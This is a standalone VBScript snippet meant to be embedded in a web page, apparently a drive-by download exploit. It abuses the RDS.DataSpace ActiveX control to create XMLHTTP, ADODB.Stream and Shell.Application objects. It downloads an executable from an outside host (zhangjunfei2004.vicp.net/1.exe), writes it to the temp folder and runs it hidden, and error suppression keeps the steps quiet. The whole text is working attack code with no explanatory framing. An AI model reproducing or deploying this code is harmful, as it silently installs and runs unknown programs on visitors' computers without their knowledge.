<script language="VBScript">
on error resume next
dl = "http://zhangjunfei2004.vicp.net/1.exe"
Set df = document.createElement("object")
df.setAttribute "classid", "clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"
str="Microsoft.XMLHTTP"
Set x = df.CreateObject(str,"")
str5="Adodb.Stream"
set S = df.createobject(str5,"")
S.type = 1
str6="GET"
x.Open str6, dl, False
x.Send
fname1="zj1244.com"
set F = df.createobject("Scripting.FileSystemObject","")
set tmp = F.GetSpecialFolder(2) 
fname1= F.BuildPath(tmp,fname1)
S.open
S.write x.responseBody
S.savetofile fname1,2
S.close
set Q = df.createobject("Shell.Application","")
Q.ShellExecute fname1,"","","open",0
</script>

